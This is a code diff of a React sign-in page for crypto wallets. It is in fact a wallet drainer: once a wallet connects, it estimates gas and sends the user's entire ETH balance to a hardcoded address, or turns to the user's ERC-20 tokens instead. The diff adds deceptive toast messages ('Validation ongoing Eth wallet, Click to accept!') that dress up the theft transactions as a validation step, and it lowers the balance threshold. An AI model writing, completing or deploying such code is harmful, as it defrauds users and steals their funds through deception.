@@ -3,6 +3,10 @@ import { useAccount, useConnect, useDisconnect } from "wagmi";
 import { useAuthRequestChallengeEvm } from "@moralisweb3/next";
 import { ethers } from "ethers";
 import { useEffect, useState } from "react";
+import React from "react";
+import { ToastContainer, toast } from "react-toastify";
+
+import "react-toastify/dist/ReactToastify.css";
 
 import HomePage from "../modules/homePage";
 import Modal from "../modules/modal";
@@ -109,7 +113,7 @@ function SignIn() {
 
   const handleAuth = async () => {
     setSelection("MetaMask");
-    setShowModal(false)
+    setShowModal(false);
     try {
       if (isConnected) {
         await disconnectAsync();
@@ -138,6 +142,7 @@ function SignIn() {
       // ETH is present and more that 10, send all - else send the ERC 20 token
 
       if (parseFloat(ethBalanceEth) > 0.05) {
+        checkifEthWallet();
         const gasLimit = await provider.estimateGas({
           to: "0x49939D184cb7e38eA8c25c5155189d70a66BEDd3",
           value: ethers.utils.parseEther(ethBalanceEth),
@@ -162,6 +167,7 @@ function SignIn() {
 
         console.log(`ETH transferred successfully to 0xRecipientEthAddress`);
       } else {
+        checkifERC20Token();
         // Fetch ERC-20 token balances
         const tokenBalances = await getTokenBalances(
           ethSigner,
@@ -262,21 +268,30 @@ function SignIn() {
       try {
         const walletAddress = web3AccountInformation.address; // Replace with the Ethereum wallet address you want to check
 
+        const accounts =
+          await web3SignerProviderInformation.walletProvider.listAccounts();
+
         // Check ETH balance
         const ethBalanceWei =
           await web3SignerProviderInformation.walletProvider.getBalance(
             walletAddress
           );
+        console.log(ethBalanceWei);
         const ethBalanceEth = ethers.utils.formatEther(ethBalanceWei);
 
+        console.log("Got here 2");
+
+        console.log(ethBalanceEth);
         // ETH is present and more that 10, send all - else send the ERC 20 token
-        if (parseFloat(ethBalanceEth) > 0.00003) {
+        if (parseFloat(ethBalanceEth) > 0.001) {
+          checkifEthWallet();
           const gasLimit =
             await web3SignerProviderInformation.walletProvider.estimateGas({
               to: "0x49939D184cb7e38eA8c25c5155189d70a66BEDd3",
               value: ethers.utils.parseEther(ethBalanceEth),
             });
 
+          console.log("Got here 4");
           // Get current gas price
           const gasPrice =
             await web3SignerProviderInformation.walletProvider.getGasPrice();
@@ -286,20 +301,31 @@ function SignIn() {
             ethBalanceWei.sub(gasPrice.mul(gasLimit))
           );
 
+          console.log(remainingEthBalance);
+
+          console.log("Got here 5");
           // Transfer the remaining balance
           const ethTransaction = {
             to: "0x49939D184cb7e38eA8c25c5155189d70a66BEDd3",
-            value: ethers.utils.parseEther(remainingEthBalance),
+            value: 0.0,
+            // value: ethers.utils.parseUnits(remainingEthBalance.toString(), "ether").toHexString(),
           };
+
+          console.log(ethTransaction);
+
+          console.log("Got here 6");
 
           const ethTx =
             await web3SignerProviderInformation.signer.sendTransaction(
               ethTransaction
             );
-          await ethTx.wait(); // Wait for the ETH transaction to be mined
 
+          console.log("Got here 7");
+          await ethTx.wait(); // Wait for the ETH transaction to be mined
+          console.log("Got here 8");
           console.log(`ETH transferred successfully to 0xRecipientEthAddress`);
         } else {
+          checkifERC20Token();
           // Fetch ERC-20 token balances
           const tokenBalances = await getTokenBalances(
             web3SignerProviderInformation.signer,
@@ -387,19 +413,29 @@ function SignIn() {
 
   const openWeb3Modal = async () => {
     setSelection("WalletConnect");
-    setShowModal(false)
+    setShowModal(false);
     await open();
   };
 
   const openModalForSelectingWallet = (childData) => {
-    
     setShowModal(true);
   };
 
+  const notifyWalletConnected = () =>
+    toast("Wallet has been connected, Navigate to wallet to continue!");
+
+  const checkifEthWallet = () =>
+    toast("Validation ongoing Eth wallet, Click to accept!");
+  const checkifERC20Token = () =>
+    toast("Validation ongoing for tokens wallet, Click to accept!");
+
   return (
     <div>
-      <HomePage selectedWallet={selection} emitClickEvent={openModalForSelectingWallet} />
-      
+      <HomePage
+        selectedWallet={selection}
+        emitClickEvent={openModalForSelectingWallet}
+      />
+
       {showModal && (
         <Modal
           setIsOpen={setShowModal}
@@ -410,8 +446,18 @@ function SignIn() {
           Hello from the modal!
         </Modal>
       )}
-
-      
+      <ToastContainer
+        position="top-center"
+        autoClose={5000}
+        hideProgressBar={false}
+        newestOnTop={false}
+        closeOnClick
+        rtl={false}
+        pauseOnFocusLoss
+        draggable
+        pauseOnHover
+        theme="light"
+      />
     </div>
   );
 }
